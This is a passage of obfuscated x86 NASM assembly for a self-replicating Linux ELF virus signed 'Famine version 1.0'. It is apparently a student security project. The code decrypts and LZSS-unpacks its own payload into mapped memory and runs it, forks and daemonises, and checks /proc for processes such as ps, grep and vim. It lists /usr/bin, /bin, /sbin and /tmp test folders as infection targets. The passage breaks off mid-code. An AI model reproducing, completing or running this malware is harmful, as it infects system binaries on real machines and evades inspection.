; REGISTERS : %m6, %m7, %m8, %vsp
; Do not touch those registers as they contain sensitive data
; about different memory pages addresses.

%include "inc.asm"

DEFAULT rel
GLOBAL _start

SECTION .text

    nop
_start:
    nop
    call        _virus

align 16
_signature:
    .start: db "Famine version 1.0 (c)oded by mamaurai:xchalle - "
    .startsize: equ $-.start
    .index: times 4 db 0x30
    db 0x00
align 16
_eos:

;- GLOBAL variables ----------------------------------
signature_len: equ _eos-_signature
non_packed_len: equ _packed-_start
virus_len: dd 0x00000000
entrypoint: dq 0x0000000000000000
;-----------------------------------------------------
; PUBLIC PART (This part isn't encrypted or packed).
_public:
;-----------------------------------------------------
; Public Structures (Structures used by public
; functions).
struc _UEC_OFF
    .mapaddr    resq 0x1
endstruc
struc _LZSSD_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .length     resq 0x1
    .index      resd 0x1
    .bits_buf   resb 0x1
    .mask       resb 0x1
    .bits       resq 0x1
endstruc
;-----------------------------------------------------
; Public Preprocessor Values.
tracerline_size: equ 11
columns_size: equ 7
lines_size: equ 5
debugging_size: equ 23
original_virus_len: equ _eof-_start
;-----------------------------------------------------
; Public code.
;-----------------------------------------------------
_virus:
    jmp         ..@CIbyJVulIRVR
..@U0RV6E5agaYQ:
    mov         rax, SYS_MUNMAP
    jmp         $+4
db 0x39, 0x40
    jmp         ..@uEjMp8TqcDFI
..@3KFATmxgCSMP:
    GGLOBAL     _packed
    jmp         ..@pgP8yfc1xp9Q
..@5WAirewH04Vb:
    mov         rax, SYS_EXIT
    jmp         $+4
db 0x57, 0xc4
    jmp         ..@zGyTJca67Oij
..@OKax6pqHrLUM:
    xor         r3, r3
    jmp         $+5
db 0xdd, 0x9f, 0x40
    jb          ..@pd8tjlMvqPVE
    jae         ..@pd8tjlMvqPVE
..@6bNdLwJblsiH:
    syscall
    cmp         eax, 0x0
    jl          ..@mngWdOlXaNKS
    jmp         $+3
db 0xe8
    jb          ..@tEcnr1A9m68t
    jae         ..@tEcnr1A9m68t
..@pA73hhWkYVrJ:
    xor         r1, r1
    jl          ..@AVdQSrWC6ilG
    jge         ..@AVdQSrWC6ilG
..@HfDjlCVqosT7:
    jz          ..@OnFwG6EPZrpz
    jb          ..@mngWdOlXaNKS
    jae         ..@mngWdOlXaNKS
..@33FoV5GI4RIm:
    push        rdi
    jmp         $+5
db 0x54, 0xc4, 0x6d
    jb          ..@y2cQIkBMnOAI
    jae         ..@y2cQIkBMnOAI
..@OeeUl8QAcdOS:
    pop         r3
    jmp         $+3
db 0xef
    je          ..@33BhObamDCEw
    jne         ..@33BhObamDCEw
..@NFe94l09rEqK:
    mov         rcx, 8
    call        ..@Hye1MQiC93Eb
    xor         rdi, rdi
    jmp         $+3
db 0x63
    jmp         ..@kF7rcML0Zz7e
..@840hqr23W4Su:
    xor         r1, r1
    xor         r2, r2
    xor         r3, r3
    jmp         $+5
db 0x11, 0x21, 0x04
    jmp         ..@FZ909ZIvsgUP
..@0pI3n8wuQacu:
    sub         rsp, _LZSSD_OFF_size
    jmp         $+4
db 0x3c, 0xe1
    jl          ..@HEOSMvCKiVOW
    jge         ..@HEOSMvCKiVOW
..@mRWSuuyWCKT3:
    mov         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    jb          ..@JLNr5vaZOkJw
    jae         ..@JLNr5vaZOkJw
..@uy8uqOqLHlnz:
    mov         r3, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         $+3
db 0x18
    je          ..@pgJzcLewWNoi
    jne         ..@pgJzcLewWNoi
..@vL0UgxcLDkZS:
    mov         rcx, POSITION_BITS
    jmp         $+5
db 0xa0, 0x50, 0x4d
    jmp         $+3
db 0x0a
    js          ..@oRmN2tHxEHPs
    jns         ..@oRmN2tHxEHPs
..@NRf4Dn2i7AXn:
%ifdef X86_64
    mov         edx, 111b
    mov         r10, 0x22
%endif
    jmp         $+3
db 0xd5
    jmp         $+3
db 0x5a
    jmp         $+4
db 0x39, 0x93
    js          ..@FRXgF8pTqkDb
    jns         ..@FRXgF8pTqkDb
..@2jmG196D9Hbu:
    xor         rax, rax
    jmp         $+4
db 0xb0, 0x6d
    jl          ..@2OYAZWJXLbdg
    jge         ..@2OYAZWJXLbdg
..@jZF89adPeML7:
    GGLOBAL     _packed
    jmp         ..@KaeKyrhydpCb
..@B2gvcdtueKQv:
    xor         rax, rax
    js          ..@OeeUl8QAcdOS
    jns         ..@OeeUl8QAcdOS
..@Hi0lDl3WEIci:
    jmp         ..@OeeUl8QAcdOS
    jmp         $+4
db 0x58, 0xbf
    jb          ..@U2vksK2GpMyL
    jae         ..@U2vksK2GpMyL
..@2OYAZWJXLbdg:
    xor         rcx, rcx
    jmp         $+5
db 0x8e, 0x95, 0xac
    jmp         ..@w3ljCFYFyITx
..@GzjQ0xzNMOVu:
    cmp         BYTE [rsp+_LZSSD_OFF.mask], 0x00
    jnz         ..@7ma0I8ndfc6M
    jl          ..@LeOWUd1kbk8b
    jge         ..@LeOWUd1kbk8b
..@CmtIktyEA910:
    mov         al, BYTE [rsp+_LZSSD_OFF.buffer+rbx]
    jmp         $+4
db 0xc1, 0x56
    jmp         $+5
db 0x4d, 0x4e, 0xc1
    jmp         ..@wSnlgHl5J0Sc
..@i7lXJZrwktlU:
    mov         BYTE [rbx], al
    jmp         $+5
db 0x8a, 0xa9, 0x29
    jl          ..@JHGeLKE5ZLxA
    jge         ..@JHGeLKE5ZLxA
..@wSnlgHl5J0Sc:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    jmp         $+4
db 0x62, 0x80
    jmp         $+4
db 0x50, 0x87
    jmp         ..@hlNvFgzPQti8
ExitProgram:
    jmp         ..@pXqdc6IMHZEz
..@beLvno19pvIg:
    GGLOBAL     _start
    jl          ..@JXFTSNFjFWZT
    jge         ..@JXFTSNFjFWZT
..@WTCmadTprrFC:
    mov         QWORD [rsp+_LZSSD_OFF.length], r2
    jmp         $+4
db 0xe5, 0xbe
    jl          ..@mRWSuuyWCKT3
    jge         ..@mRWSuuyWCKT3
..@d0ZYEkWFim80:
%ifdef X86_32
    mov         edi, 0xffffffff
    push        ebp
    xor         ebp, ebp
%endif
    jmp         ..@VM8rf7ukSqdB
..@l5RA1Y83M2Jh:
    xor         rax, rax
    jmp         $+4
db 0x0f, 0x3f
    jmp         $+4
db 0x95, 0xe8
    jmp         ..@l7DDDfG7WXkI
..@80VQgQAlCilT:
    and         dl, BYTE [rsp+_LZSSD_OFF.mask]
    test        dl, dl
    jmp         $+3
db 0x84
    jmp         $+3
db 0x2a
    jmp         $+5
db 0x44, 0x37, 0x88
    jmp         ..@oZ4U98owo8WO
..@TRX0mKiJRbR9:
    xor         rax, rax
    mov         r1, QWORD [rsp+_UEC_OFF.mapaddr]
    mov         r2, original_virus_len-non_packed_len
    jmp         ..@U0RV6E5agaYQ
Strlen:
    jmp         ..@TEuRGO2Fe0hv
..@opYcDgse3TAq:
    ret
..@cdt1a4hvIbsV:
    jmp         ..@bF1idjQ5iToI
    jmp         $+3
db 0xd6
    jl          ..@9kKzdoPEkvV8
    jge         ..@9kKzdoPEkvV8
..@N0w9rPGbAv7o:
    xor         r4, r4
    mov         rax, SYS_WAIT4
    jmp         $+3
db 0xaf
    jmp         ..@JsJsDbKa1tgX
..@TEuRGO2Fe0hv:
    xor         rax, rax
    jmp         ..@bF1idjQ5iToI
..@JLNr5vaZOkJw:
    mov         rcx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    je          ..@omoz6I0NbNEg
    jne         ..@omoz6I0NbNEg
..@W7v8iS6cQDWE:
    mov         rax, QWORD [rsp+_UEC_OFF.mapaddr]
    mov         m8, rax
    call        rax
    jmp         $+4
db 0xcc, 0xdd
    jmp         $+5
db 0x22, 0x27, 0x4c
    jmp         ..@TRX0mKiJRbR9
..@EIbiL2caZjZg:
    xor         rax, rax
    jmp         ..@Imw07DXJT61o
..@oZ4U98owo8WO:
    jz          ..@p1D0hwRWTVyc
    je          ..@yPWLLnwSnRsR
    jne         ..@yPWLLnwSnRsR
..@pXqdc6IMHZEz:
    DESTROY_MX_VAR
    js          ..@5WAirewH04Vb
    jns         ..@5WAirewH04Vb
..@yPWLLnwSnRsR:
    or          eax, 1
    js          ..@p1D0hwRWTVyc
    jns         ..@p1D0hwRWTVyc
..@BKauCKOVbc7w:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jmp         ..@NPxm40skQN3V
    jmp         $+3
db 0x17
    jmp         ..@vL0UgxcLDkZS
..@OnFwG6EPZrpz:
    xor         rax, rax
    jmp         ..@SwZHdrm1c1wt
..@95EWthxc8YFP:
    jz          ..@jaKKcksjq7Gh
    xor         rdi, rdi
    jl          ..@T97Lc5pvnKoW
    jge         ..@T97Lc5pvnKoW
..@Sa9ZpkRr800g:
    mov         rbx, rsi
    jmp         $+4
db 0xd6, 0x4f
    jb          ..@R2FNLiLlGUK4
    jae         ..@R2FNLiLlGUK4
..@LeOWUd1kbk8b:
    mov         rbx, QWORD [rsp+_LZSSD_OFF.inputaddr]
    jmp         ..@MZoTgDb2pxWJ
..@w3ljCFYFyITx:
    xor         rdi, rdi
    jmp         ..@Sa9ZpkRr800g
..@4LwtkR7mU3MM:
%ifdef X86_32
    mov         esi, 0x22
%endif
    jmp         ..@d0ZYEkWFim80
..@C2DPkkpgABx8:
    mov         rsi, rax 
    mov         rcx, LENGTH_BITS
    jmp         $+3
db 0x27
    js          ..@zrK6LNP7nBUp
    jns         ..@zrK6LNP7nBUp
..@pgJzcLewWNoi:
    call        LzssDecoder
    jmp         $+3
db 0x51
    jmp         $+4
db 0x15, 0x35
    jmp         $+4
db 0xfe, 0xd7
    jmp         $+3
db 0x8c
    je          ..@W7v8iS6cQDWE
    jne         ..@W7v8iS6cQDWE
..@5t16lfeKIxF5:
    DESTROY_MX_VAR
    jmp         $+4
db 0x9f, 0x72
    jb          ..@mHEZCVFT0UxQ
    jae         ..@mHEZCVFT0UxQ
..@vDWFDyrukDqx:
    xor         rdi, rdi
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    jb          ..@rnLFg1NRdjKP
    jae         ..@rnLFg1NRdjKP
..@FZ909ZIvsgUP:
    xor         r4, r4
    GGLOBAL     entrypoint
    cmp         QWORD [r5], 0x0000000000000000
    jmp         $+4
db 0x43, 0x45
    jl          ..@ru94TeNZiNGY
    jge         ..@ru94TeNZiNGY
..@LGtzEaupptWS:
    jz          ..@9kKzdoPEkvV8
    jmp         $+4
db 0x97, 0x0f
    jmp         ..@bwXJPKZ7pSa6
..@3yGtKkF7ML13:
%ifdef X86_32
    mov         edx, 111b
%endif
    js          ..@4LwtkR7mU3MM
    jns         ..@4LwtkR7mU3MM
..@pgP8yfc1xp9Q:
    mov         r1, r5
    jb          ..@c55mXP94Z0SS
    jae         ..@c55mXP94Z0SS
..@VM8rf7ukSqdB:
%ifdef X86_32
    mov         eax, SYS_MMAP2
    int         0x80
    pop         ebp
%endif
    jmp         $+4
db 0xef, 0x4a
    jl          ..@FkvklF6OFdwR
    jge         ..@FkvklF6OFdwR
..@bF1idjQ5iToI:
    cmp         BYTE [r1 + rax], 0x0
    jl          ..@LGtzEaupptWS
    jge         ..@LGtzEaupptWS
..@SwZHdrm1c1wt:
    mov         eax, SYS_SETSID
    syscall
    jmp         $+3
db 0x0c
    jmp         ..@5AIez5dgPpSR
..@gQVJ7pj9ymyo:
    cmp         cl, dl
    jl          ..@HCW1wSxeCl3B
    jge         ..@HCW1wSxeCl3B
..@uEjMp8TqcDFI:
    syscall
    js          ..@Sqa00jaUjzyn
    jns         ..@Sqa00jaUjzyn
..@bwXJPKZ7pSa6:
    add         rax, 1
    jmp         ..@cdt1a4hvIbsV
..@IkVvjRmob4Sa:
    test        eax, eax
    jmp         $+3
db 0x6d
    jmp         ..@95EWthxc8YFP
..@AVdQSrWC6ilG:
    xor         r2, r2
    xor         r3, r3
    xor         r4, r4
    js          ..@BykBRhbGpjJU
    jns         ..@BykBRhbGpjJU
..@Ff2PQD8FlcRK:
    cmp         QWORD [rdi], 0x00
    jne         ..@raTEZCr3pIqr
    add         rdi, bytes
    jmp         $+5
db 0xdc, 0x10, 0x19
    jmp         $+4
db 0x0f, 0x79
    je          ..@mJNbZDQkFbXI
    jne         ..@mJNbZDQkFbXI
..@Imw07DXJT61o:
    mov         rax, SYS_FORK
    jmp         $+5
db 0x46, 0x41, 0x4d
    jb          ..@6bNdLwJblsiH
    jae         ..@6bNdLwJblsiH
..@IUEiO22Amp7s:
    test        rax, rax
    jmp         $+3
db 0xc5
    jb          ..@5xbJFfBX7NFV
    jae         ..@5xbJFfBX7NFV
..@zrK6LNP7nBUp:
    call        ..@Hye1MQiC93Eb
    add         rax, 1
    mov         rdx, rax
    jmp         $+5
db 0x33, 0x7c, 0xf2
    jmp         $+4
db 0x20, 0x22
    je          ..@2jmG196D9Hbu
    jne         ..@2jmG196D9Hbu
..@5AIez5dgPpSR:
    xor         rax, rax
    js          ..@lTcdGxwisT0V
    jns         ..@lTcdGxwisT0V
..@Kkq19ejTVgGe:
    sub         rdi, 1
    jb          ..@xjzTa6PkM1if
    jae         ..@xjzTa6PkM1if
..@R2FNLiLlGUK4:
    add         bx, cx
    and         bx, WINDOW_LENGTH-1
    jmp         $+4
db 0x9e, 0x55
    jmp         $+3
db 0x25
    js          ..@CmtIktyEA910
    jns         ..@CmtIktyEA910
..@JsJsDbKa1tgX:
    syscall
    add         rsp, bytes
    jmp         ..@beLvno19pvIg
..@LDjuDBLDbaXy:
    sub         r2, non_packed_len
    jl          ..@uy8uqOqLHlnz
    jge         ..@uy8uqOqLHlnz
..@WdRm2uDLe2Mm:
    INIT_MX_VAR
    mov         vsp, rdi
    je          ..@g6F9mTohAlAl
    jne         ..@g6F9mTohAlAl
..@mJNbZDQkFbXI:
    mov         m4, rdi
    jmp         $+3
db 0xde
    jmp         ..@840hqr23W4Su
..@urHfmnnzp0zK:
    push        r1
    push        r2
    push        r3
    jmp         ..@l5RA1Y83M2Jh
..@FRXgF8pTqkDb:
%ifdef X86_64
    mov         r8, 0xffffffffffffffff
    mov         eax, SYS_MMAP
    syscall
%endif
    je          ..@zHxDuseGJHIW
    jne         ..@zHxDuseGJHIW
..@5z8hMRpe1Twy:
    sub         rsp, _UEC_OFF_size
    js          ..@MwFwUbfXZmFv
    jns         ..@MwFwUbfXZmFv
..@TObWnrG9bWwn:
    add         rsp, _LZSSD_OFF_size
    jmp         $+5
db 0xaa, 0x8e, 0xfb
    jmp         $+3
db 0x3d
    jmp         ..@opYcDgse3TAq
..@l7DDDfG7WXkI:
    mov         al, BYTE [r1]
    js          ..@OXJiXdPHkcSv
    jns         ..@OXJiXdPHkcSv
..@FkvklF6OFdwR:
%ifdef X86_64
    xor         r9, r9
    mov         esi, original_virus_len-non_packed_len
%endif
    jmp         $+3
db 0xdd
    jmp         ..@NRf4Dn2i7AXn
..@4I9PzEFGBsHX:
    xor         rax, rax
    xor         rdx, rdx
    xor         rbx, rbx
    jmp         $+5
db 0xb1, 0xa4, 0x65
    jmp         ..@GzjQ0xzNMOVu
..@g6F9mTohAlAl:
    mov         rdi, rbp
    jmp         ..@raTEZCr3pIqr
..@mngWdOlXaNKS:
    mov         r1, rax
    xor         r2, r2
    xor         r3, r3
    jmp         $+5
db 0x98, 0x07, 0x04
    jmp         ..@N0w9rPGbAv7o
..@lTcdGxwisT0V:
    mov         rax, SYS_FORK
    syscall
    jmp         $+4
db 0x7b, 0xfa
    jl          ..@IkVvjRmob4Sa
    jge         ..@IkVvjRmob4Sa
..@9kKzdoPEkvV8:
    ret
    js          Strncmp
    jns         Strncmp
..@zHxDuseGJHIW:
    mov         QWORD [rsp+_UEC_OFF.mapaddr], rax
    jmp         ..@3KFATmxgCSMP
..@tEcnr1A9m68t:
    test        eax, eax
    jmp         $+4
db 0x6e, 0xfb
    jmp         $+4
db 0x0f, 0x0f
    jmp         $+4
db 0x62, 0x0a
    jl          ..@HfDjlCVqosT7
    jge         ..@HfDjlCVqosT7
..@jaKKcksjq7Gh:
    jmp         DecryptExecutableCode
    jmp         ExitProgram
..@c55mXP94Z0SS:
    GGLOBAL     virus_len
    jmp         ..@1SHKNJTC0sIw
..@HEOSMvCKiVOW:
    mov         QWORD [rsp+_LZSSD_OFF.inputaddr], r1
    mov         QWORD [rsp+_LZSSD_OFF.outputaddr], r3
    mov         BYTE [rsp+_LZSSD_OFF.mask], 0x0
    jmp         $+4
db 0x45, 0x58
    jmp         ..@WTCmadTprrFC
..@2B5pqXGjkmwv:
    add         ecx, 1
    jmp         $+4
db 0xad, 0xaa
    jl          ..@gQVJ7pj9ymyo
    jge         ..@gQVJ7pj9ymyo
..@RWDEqBZnX9ST:
    jnz         ..@l7DDDfG7WXkI
    jmp         ..@B2gvcdtueKQv
..@MZoTgDb2pxWJ:
    mov         dl, BYTE [rbx]
    mov         BYTE [rsp+_LZSSD_OFF.bits_buf], dl
    inc         QWORD [rsp+_LZSSD_OFF.inputaddr]
    jmp         $+3
db 0xfd
    js          ..@ZY3AGCjuIgum
    jns         ..@ZY3AGCjuIgum
..@D4XDVUBl65fV:
    xor         r1, r1
    js          ..@C52cPeZkbog3
    jns         ..@C52cPeZkbog3
..@NPxm40skQN3V:
    mov         rcx, 1
    je          ..@qjL2UOCpl9bp
    jne         ..@qjL2UOCpl9bp
..@J0TYH3El69Vy:
    add         r2, 1
    dec         r3
    jmp         $+3
db 0x96
    jl          ..@RWDEqBZnX9ST
    jge         ..@RWDEqBZnX9ST
..@omoz6I0NbNEg:
    lea         rdi, QWORD [rsp+_LZSSD_OFF.buffer] 
    mov         rax, 0x20
    rep         stosb
    jmp         $+5
db 0x18, 0xe4, 0x4c
    jl          ..@HmDdXWatGJ6r
    jge         ..@HmDdXWatGJ6r
..@HCW1wSxeCl3B:
    jle         ..@Sa9ZpkRr800g
    jmp         $+4
db 0x1f, 0x0c
    jmp         $+4
db 0xba, 0x87
    js          ..@NPxm40skQN3V
    jns         ..@NPxm40skQN3V
..@33BhObamDCEw:
    pop         r2
    pop         r1
    ret
    je          DecryptExecutableCode
    jne         DecryptExecutableCode
..@JXFTSNFjFWZT:
    mov         r1, r5
    GGLOBAL     entrypoint
    sub         r1, QWORD [r5]
    js          ..@5t16lfeKIxF5
    jns         ..@5t16lfeKIxF5
..@KaeKyrhydpCb:
    mov         m8, r5
    call        Processes
    xor         r1, r1
    jmp         $+5
db 0x69, 0xb7, 0x23
    jb          ..@8Kr6Y4IGcXOj
    jae         ..@8Kr6Y4IGcXOj
..@8Kr6Y4IGcXOj:
    call        ExitProgram
    js          ..@5z8hMRpe1Twy
    jns         ..@5z8hMRpe1Twy
..@hI8EFFqxLcTe:
    inc         DWORD [rsp+_LZSSD_OFF.index]
    jl          ..@BKauCKOVbc7w
    jge         ..@BKauCKOVbc7w
..@xjzTa6PkM1if:
    sub         rdi, 0x5
    jmp         $+5
db 0x32, 0x35, 0x88
    jmp         $+4
db 0x6e, 0x9a
    js          ..@WdRm2uDLe2Mm
    jns         ..@WdRm2uDLe2Mm
..@hlNvFgzPQti8:
    mov         BYTE [rbx], al
    jb          ..@keMvmLtineRR
    jae         ..@keMvmLtineRR
..@raTEZCr3pIqr:
    add         rdi, bytes
    jmp         $+5
db 0xf1, 0x99, 0x0e
    jb          ..@Ff2PQD8FlcRK
    jae         ..@Ff2PQD8FlcRK
..@0n9DyLAIyGDE:
    jne         ..@5z8hMRpe1Twy
    jmp         $+3
db 0xa8
    jmp         $+3
db 0x72
    jmp         ..@jZF89adPeML7
..@ru94TeNZiNGY:
    je          ..@jaKKcksjq7Gh
    js          ..@EIbiL2caZjZg
    jns         ..@EIbiL2caZjZg
..@zGyTJca67Oij:
    syscall
    jmp         $+3
db 0x69
    jl          Strlen
    jge         Strlen
..@keMvmLtineRR:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    jmp         $+4
db 0xf5, 0x7c
    jmp         ..@vDWFDyrukDqx
..@Sqa00jaUjzyn:
    sub         rsp, _UEC_OFF_size
    jmp         $+5
db 0x04, 0x2c, 0x1f
    jb          ..@6JgiWt1xjbxj
    jae         ..@6JgiWt1xjbxj
..@kF7rcML0Zz7e:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    jmp         ..@i7lXJZrwktlU
..@qjL2UOCpl9bp:
    call        ..@Hye1MQiC93Eb
    mov         QWORD [rsp+_LZSSD_OFF.bits], rax
    cmp         QWORD [rsp+_LZSSD_OFF.length], 0x00
    jmp         $+3
db 0x3d
    jmp         $+5
db 0xa0, 0x85, 0xa6
    js          ..@ASZYna4yLi5q
    jns         ..@ASZYna4yLi5q
..@CIbyJVulIRVR:
    pop         rdi
    jmp         ..@Kkq19ejTVgGe
..@C52cPeZkbog3:
    xor         r2, r2
    jmp         $+4
db 0x38, 0x35
    jb          ..@OKax6pqHrLUM
    jae         ..@OKax6pqHrLUM
..@p1D0hwRWTVyc:
    shr         BYTE [rsp+_LZSSD_OFF.mask], 1
    sub         rcx, 1
    jnz         ..@GzjQ0xzNMOVu
    jl          ..@33FoV5GI4RIm
    jge         ..@33FoV5GI4RIm
..@JHGeLKE5ZLxA:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    js          ..@hI8EFFqxLcTe
    jns         ..@hI8EFFqxLcTe
..@ASZYna4yLi5q:
    jg          ..@IUEiO22Amp7s
    jmp         ..@TObWnrG9bWwn
    jmp         $+4
db 0x8d, 0x48
    jl          ..@Hye1MQiC93Eb
    jge         ..@Hye1MQiC93Eb
..@5xbJFfBX7NFV:
    jz          ..@vL0UgxcLDkZS
    jmp         ..@NFe94l09rEqK
..@pd8tjlMvqPVE:
%ifdef X86_32
    mov         ecx, original_virus_len-non_packed_len
%endif
    jmp         ..@3yGtKkF7ML13
..@OXJiXdPHkcSv:
    cmp         BYTE [r2], al
    je          ..@U2vksK2GpMyL
    sub         al, BYTE [r2]
    jmp         $+4
db 0xcb, 0x42
    jmp         $+3
db 0x90
    jmp         $+4
db 0xfc, 0x57
    jb          ..@Hi0lDl3WEIci
    jae         ..@Hi0lDl3WEIci
..@Hye1MQiC93Eb:
    pop         rdi
    jmp         $+3
db 0x34
    jmp         $+4
db 0x37, 0xc9
    js          ..@4I9PzEFGBsHX
    jns         ..@4I9PzEFGBsHX
..@XuxUk6tK9w4f:
    mov         r2d, DWORD [r5]
    jmp         $+3
db 0xab
    jmp         $+4
db 0x41, 0x02
    jmp         ..@LDjuDBLDbaXy
..@1SHKNJTC0sIw:
    xor         r2, r2
    jmp         $+5
db 0x37, 0x0f, 0xbd
    js          ..@XuxUk6tK9w4f
    jns         ..@XuxUk6tK9w4f
..@y2cQIkBMnOAI:
    ret
    js          ..@TObWnrG9bWwn
    jns         ..@TObWnrG9bWwn
LzssDecoder:
    jmp         ..@0pI3n8wuQacu
..@G6lxVyFY1QDN:
    GGLOBAL     virus_len
    cmp         DWORD [r5], 0x00000000
    jl          ..@0n9DyLAIyGDE
    jge         ..@0n9DyLAIyGDE
..@7ma0I8ndfc6M:
    shl         eax, 1
    mov         dl, BYTE [rsp+_LZSSD_OFF.bits_buf]
    jmp         $+5
db 0x03, 0x3b, 0x4d
    jmp         $+3
db 0x2a
    jb          ..@80VQgQAlCilT
    jae         ..@80VQgQAlCilT
Strncmp:
    jmp         ..@urHfmnnzp0zK
..@T97Lc5pvnKoW:
    call        ExitProgram
    jmp         $+5
db 0x4d, 0x88, 0x69
    js          ..@jaKKcksjq7Gh
    jns         ..@jaKKcksjq7Gh
..@BykBRhbGpjJU:
    xor         r5, r5
    jmp         rax
    jmp         $+4
db 0x45, 0x94
    js          ..@OnFwG6EPZrpz
    jns         ..@OnFwG6EPZrpz
..@6JgiWt1xjbxj:
    call        ExitProgram
    jl          LzssDecoder
    jge         LzssDecoder
..@U2vksK2GpMyL:
    add         r1, 1
    js          ..@J0TYH3El69Vy
    jns         ..@J0TYH3El69Vy
..@MwFwUbfXZmFv:
    xor         rax, rax
    jmp         $+4
db 0x77, 0x79
    jmp         $+5
db 0x16, 0x78, 0x86
    jmp         ..@D4XDVUBl65fV
..@ZY3AGCjuIgum:
    dec         QWORD [rsp+_LZSSD_OFF.length]
    mov         BYTE [rsp+_LZSSD_OFF.mask], 10000000b
    jmp         $+4
db 0x0e, 0x33
    jmp         ..@7ma0I8ndfc6M
..@rnLFg1NRdjKP:
    inc         DWORD [rsp+_LZSSD_OFF.index]
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jmp         $+4
db 0x3f, 0x54
    jmp         $+5
db 0x64, 0xc7, 0x11
    jmp         ..@2B5pqXGjkmwv
..@HmDdXWatGJ6r:
    jmp         ..@NPxm40skQN3V
    js          ..@IUEiO22Amp7s
    jns         ..@IUEiO22Amp7s
..@oRmN2tHxEHPs:
    call        ..@Hye1MQiC93Eb
    jmp         $+3
db 0x16
    jmp         ..@C2DPkkpgABx8
DecryptExecutableCode:
    jmp         ..@G6lxVyFY1QDN
..@mHEZCVFT0UxQ:
    mov         rax, r1
    jb          ..@pA73hhWkYVrJ
    jae         ..@pA73hhWkYVrJ

;-----------------------------------------------------
; PACKED & ENCRYPTED PART (This part of the code is 
; packed with LZSS then encrpyted and is executed in 
; a mapped zone).
_packed:
    jmp         Processes
;-----------------------------------------------------
; Packed & Encrypted structures.
struc _PROC_OFF
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x100
    .filefd     resd 0x1
endstruc
struc _NBF_OFF
    .index      resw 0x1
    .file       resq 0x1
    .key        resb 0x20
endstruc
struc _PAYLOAD_OFF
    .key        resb 0x20
    .index      resw 0x1
    .entry      resq 0x1
endstruc
struc _LZSSE_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .saveoutptr resq 0x1
    .length     resq 0x1
    .buffersize resw 0x1
    .la_index   resw 0x1
    .w_index    resw 0x1
    .cmp_len    resb 0x1
    .match_pos  resw 0x1
    .match_len  resb 0x1
    .character  resb 0x1
    .bits       resb 0x1
    .mask       resb 0x1
endstruc
struc _UPDATASIG_OFF
    .signaddr   resq 0x1
    .index      resw 0x1
endstruc
struc _INFDIR_OFF
    .depth      resb 0x1
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x101*(SUBDIR_MAXDEPTH+1)
endstruc
struc _INFFILE_OFF
    .file       resb file_size
    .entry      resq 0x1
endstruc
struc _VADDR_OFF
    ._vaddr     resq 0x1
    .tmp_vaddr  resq 0x1
    .tmp_offset resq 0x1
endstruc
struc _DYNPIE_OFF
    .ptr        resq 0x1
    .sh_ptr     resq 0x1
    .shentsize  resw 0x1
    .shnum      resw 0x1
endstruc
;-----------------------------------------------------
; Packed & Encrypted variables.
VARIABLES packed
procdir:    db "/proc/", 0
status:     db "/status", 0

procs:
proc6:      db "dpkg", 0
proc5:      db "apt", 0
proc4:      db "ps", 0
proc3:      db "grep", 0
proc2:      db "cat", 0
proc1:      db "vim", 0
db 0x00

dirs_root:
bindir1:    db "/usr/local/sbin", 0
bindir2:    db "/usr/local/bin", 0
bindir3:    db "/usr/sbin", 0
bindir4:    db "/usr/bin", 0
bindir5:    db "/sbin", 0
bindir6:    db "/bin", 0
dirs_tmp:
test2:      db "/tmp/test2", 0
test:       db "/tmp/test", 0
db 0x00
;-----------------------------------------------------
; Packed & Encrypted code.
;-----------------------------------------------------
Processes:
    jmp         ..@DLMNeLwz3Bbt
..@nVKVrWaGZRpY:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    xor         rax, rax
    jmp         $+3
db 0x05
    jmp         $+3
db 0x74
    jb          ..@afKEHwm2P4XH
    jae         ..@afKEHwm2P4XH
..@phKG7VwNz4oi:
    sub         rsp, _LZSSE_OFF_size
    jb          ..@Ena2QH6GxOW4
    jae         ..@Ena2QH6GxOW4
..@9zOFhVxiu4Oc:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    mov         rsi, rdi
    add         rdi, rbx
    jmp         $+4
db 0x06, 0x05
    je          ..@gWxR6ZvWflWa
    jne         ..@gWxR6ZvWflWa
..@DLMNeLwz3Bbt:
    sub         rsp, _PROC_OFF_size
    jmp         $+4
db 0x55, 0x41
    jb          ..@pk6TZ2H9NV10
    jae         ..@pk6TZ2H9NV10
..@11n8Gn6vz60J:
    sub         r1, r4
    jmp         ..@gGTvRIIP7KaW
IsNum:
    jmp         ..@Q0bw8o3R91uH
..@7FNzJkayGXPK:
    rep         cmpsb
    jl          ..@4Jqj2KJTJ58D
    jge         ..@4Jqj2KJTJ58D
..@iuezeTQbEIDc:
    add         r2, rax
    jb          ..@zIienJQVfkDz
    jae         ..@zIienJQVfkDz
..@OiSDxT7OFdi4:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    sub         ax, WORD [rsp+_LZSSE_OFF.la_index]
    jb          ..@SwAaP3n8xYzX
    jae         ..@SwAaP3n8xYzX
..@wDJBofrJYI1A:
    jnz         ..@AedPqswzp2hU
    jmp         ..@GJJ9NORQFDFZ
..@aSlnyin0pEDd:
%ifdef X86_64
    mov         rsi, original_virus_len+PADDING
    mov         edx, 11b
%endif
    jmp         ..@zXbOdMTUSa1t
..@5QeJQPXdgat5:
